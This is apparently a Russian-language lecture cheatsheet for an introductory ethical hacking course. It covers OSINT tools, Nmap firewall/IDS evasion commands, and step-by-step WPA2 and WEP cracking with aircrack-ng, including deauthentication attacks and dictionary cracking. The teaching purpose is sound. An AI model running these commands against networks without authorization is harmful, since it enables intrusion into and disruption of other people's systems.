LECTURE 01 Introduction to Hacking Lab · Kali Linux Basics
🎯 Ключевые термины
  • Hacker — исследует и анализирует системы
  • White Hat — этичный хакер, защищает системы
  • Black Hat — злоумышленник, вредоносные цели
  • Gray Hat — без разрешения, но без злого умысла
  • Vulnerability — слабое место в системе
  • Exploit — метод использования уязвимости
⚔️ Offensive Security
  • Penetration Testing — тест системы на уязвимости путём попытки взлома
  • Red Teaming — долгосрочные атаки, симуляция реальных угроз
  • Ethical Hacking — хакерские техники в целях безопасности
🛡️ Defensive Security
  • Blue Teaming — защита инфраструктуры и мониторинг
  • Incident Response — анализ и устранение последствий атаки
  • Threat Hunting — активный поиск следов хакеров в сети
  • IDS — Intrusion Detection System
Отличие Offensive vs Defensive: Offensive — активный поиск уязвимостей (атака). Defensive — защита, мониторинг, реагирование на инциденты. Оба подхода необходимы для комплексной безопасности.

LECTURE 02 Gathering Information · OSINT
🔍 Passive Reconnaissance
  • Нет прямого взаимодействия с целью
  • Труднее обнаружить
  • Использует сторонние источники
  • Примеры: Google Dorking, WHOIS, Shodan
  • Domain enumeration, Packet inspection
  • OSINT, Recon-ng, Eavesdropping
⚡ Active Reconnaissance
  • Прямое взаимодействие с целью
  • Легче обнаружить
  • Инструменты взаимодействуют с таргетом
  • Примеры: Shodan, Nmap
  • Host/Network/User enumeration
  • Packet crafting, Service enumeration

OSINT Инструменты
🔭 Shodan

Поисковик для устройств в интернете. Индексирует не сайты, а устройства и сервисы (серверы, IoT, SCADA, камеры).

  • webcamXP — найти камеры
  • port:22 country:KZ — SSH в Казахстане
  • org:"Jusan Mobile" — по организации
  • port:3389 — RDP сервисы
  • apache country:KZ port:80
🕸️ Maltego

Визуализация связей между людьми, доменами, IP. Использует Transforms — автоматические запросы к источникам данных.

  • Граф: сущности (nodes) + связи (edges)
  • Pivot: из одной точки — целая сеть данных
  • DNS, WHOIS, соцсети, утечки
  • Для кибер-расследований и OSINT анализа
📡 theHarvester

Сбор email-адресов, субдоменов, IP, имён сотрудников. Работает с Google, Bing, DNS.

theHarvester -d example.com -b google
🌐 WHOIS

Публичная база данных для поиска информации о доменах и IP-адресах.

  • Владелец домена (имя, email, компания)
  • Дата регистрации и истечения
  • Хостинг-провайдеры и IP
  • Инструмент: who.is
🔎 Google Dorking

Продвинутые операторы Google для поиска скрытых данных, паролей, уязвимостей.

  • filetype:pdf — поиск PDF
  • inurl:login — страницы входа
  • intext:"password" — слово в тексте
  • intitle:"index of" — открытые директории
  • site:example.com — поиск в домене
  • link:example.com — ссылки на домен
🤖 SpiderFoot

Автоматизированный OSINT инструмент. Сбор и корреляция данных из множества источников.

  • Запуск: python3 sf.py -l 127.0.0.1:5001
  • Web-интерфейс для визуализации
  • Автоматическая разведка по домену/IP

TCP SYN Scan (-sS) — как работает:
Nmap отправляет SYN пакет → получает ответ:
• SYN-ACK → порт ОТКРЫТ
• RST → порт ЗАКРЫТ
• Нет ответа → порт ФИЛЬТРУЕТСЯ (firewall)
Обход Firewall и IDS
1. Decoy Scanning (-D)

Создаёт видимость сканирования с множества IP, затрудняя определение реального атакующего.

nmap -sS -D RND:10 192.168.1.1 nmap -sS -D 192.168.1.100,ME 192.168.1.1
2. Packet Fragmentation (-f)

Разбивает пакеты на фрагменты — IDS/IPS блокируют крупные пакеты.

nmap -sS -f 192.168.1.1
3. Source IP Spoofing (-S)

Подмена IP-адреса источника — цель видит чужой IP.

nmap -S 192.168.1.100 -e eth0 192.168.1.1
4. Source Port Spoofing

Имитация трафика от порта 53 (DNS) или 443 (HTTPS) для обхода firewall.

nmap -sS -p 80 --source-port 53 192.168.1.1
5. Idle/Zombie Scan (-sI)

Сканирование через «зомби» хост — цель видит IP зомби, не атакующего.

nmap -sI 192.168.1.100 192.168.1.1
6. IPv6 Scanning

Многие firewall фильтруют IPv4, но игнорируют IPv6 трафик.

nmap -6 -sS fe80::1

TCP vs UDP:
TCP — надёжный, с подтверждением доставки, медленнее. Трёхстороннее рукопожатие: SYN → SYN-ACK → ACK.
UDP — быстрый, без подтверждения, могут теряться пакеты. Используется для DNS (порт 53), SNMP (161).
LECTURE 04 Network Hacking · WPA/WPA2 Cracking · WiFi
Требования для WiFi взлома: 1) Wireless access point (своя точка доступа для практики!) 2) Wireless adapter с поддержкой packet injection и monitor mode.
Типы шифрования WiFi
🔓 OPN (Open Network)
  • БЕЗ шифрования
  • Данные в открытом виде (plaintext)
  • Можно перехватить весь трафик
  • Кафе, аэропорты, отели
  • Видны HTTP POST, cookies, credentials
⚠️ WEP (Wired Equivalent Privacy)
  • Устаревший стандарт — НЕБЕЗОПАСЕН
  • Алгоритм RC4, малые ключи
  • Повторяющиеся IV (Initialization Vectors)
  • Взламывается за минуты через aircrack-ng
  • Нужно ~20,000–60,000 IVs для взлома
🔒 WPA2 (Wi-Fi Protected Access 2)
  • AES-CCMP протокол — сильная защита
  • PSK (pre-shared key) или Enterprise
  • Нельзя взломать напрямую
  • Нужен handshake + dictionary/brute-force
  • Безопасность зависит от сложности пароля
🛡️ WPA3 (Latest Standard)
  • SAE — Simultaneous Authentication of Equals
  • "Dragonfly handshake" — против offline атак
  • Forward secrecy — старый трафик защищён
  • Protected management frames
  • Не полностью иммунен (misconfig, слабые пароли)
Инструменты Aircrack-ng Suite
airmon-ng

Переключение адаптера в Monitor Mode для перехвата всего беспроводного трафика.

airmon-ng start wlan0 # Создаст wlan0mon airmon-ng check kill # Остановить мешающие процессы
airodump-ng

Сканирование и захват WiFi трафика. Отображает сети, клиентов, handshake'и.

airodump-ng wlan0mon # Сканировать все сети airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
aireplay-ng

Deauthentication атака — принудительное отключение клиентов от AP для захвата handshake.

aireplay-ng -0 20 -a AA:BB:CC:DD:EE:FF wlan0mon # -0 = deauth, 20 = кол-во пакетов
aircrack-ng

Dictionary атака на захваченный WPA/WPA2 handshake или статистический взлом WEP.

# WPA2 aircrack-ng -w /root/rockyou-top100000.txt -b AA:BB:CC capture.cap # WEP aircrack-ng wpa_capture-04.cap
Пошаговый процесс взлома
⚠️ WPA2 Cracking — Полный процесс
1
Включить Monitor Mode
airmon-ng start wlan0 → создаёт wlan0mon
2
Сканировать сети
airodump-ng wlan0mon → получить BSSID, Channel, ESSID
3
Захват трафика целевой сети
airodump-ng -c 6 --bssid [BSSID] -w capture wlan0mon
4
Deauth атака (в отдельном терминале)
aireplay-ng -0 20 -a [BSSID] wlan0mon → ждать STATION и WPA handshake
5
Взлом handshake словарём
aircrack-ng -w /root/rockyou-top100000.txt -b [BSSID] capture.cap
⚠️ WEP Cracking — Процесс
1
Monitor Mode + Scan
Найти WEP сеть (ENC = WEP WEP)
2
Захват пакетов
airodump-ng -c 3 --bssid [BSSID] -w capture wlan0mon
3
Накопить IVs (20,000–60,000+)
Держать airodump + aireplay одновременно. Чем больше IVs — тем выше шанс.
4
Взлом ключа
aircrack-ng capture.cap → KEY FOUND! [11:BB:33:CD:55]

EXAM PREP Key Facts · Exam Cheatsheet
📌 Важнейшие факты
  • WEP взламывается через IVs (нужно 20k–60k+)
  • WPA2 взламывается через handshake + словарь
  • OPN = нет шифрования, виден весь трафик
  • Monitor mode: wlan0 → wlan0mon
  • Deauth = -0, Dictionary = -w в aircrack
  • EAPOL в airodump = handshake захвачен
  • WPA3 использует SAE (Dragonfly handshake)
  • Passive recon = труднее обнаружить
  • OSINT = публично доступные данные
  • Shodan = поисковик по устройствам, не сайтам
🌐 Порты (нужно знать)
  • 22 — SSH
  • 23 — Telnet
  • 25 — SMTP
  • 53 — DNS (UDP)
  • 80 — HTTP
  • 161 — SNMP (UDP)
  • 443 — HTTPS
  • 3389 — RDP
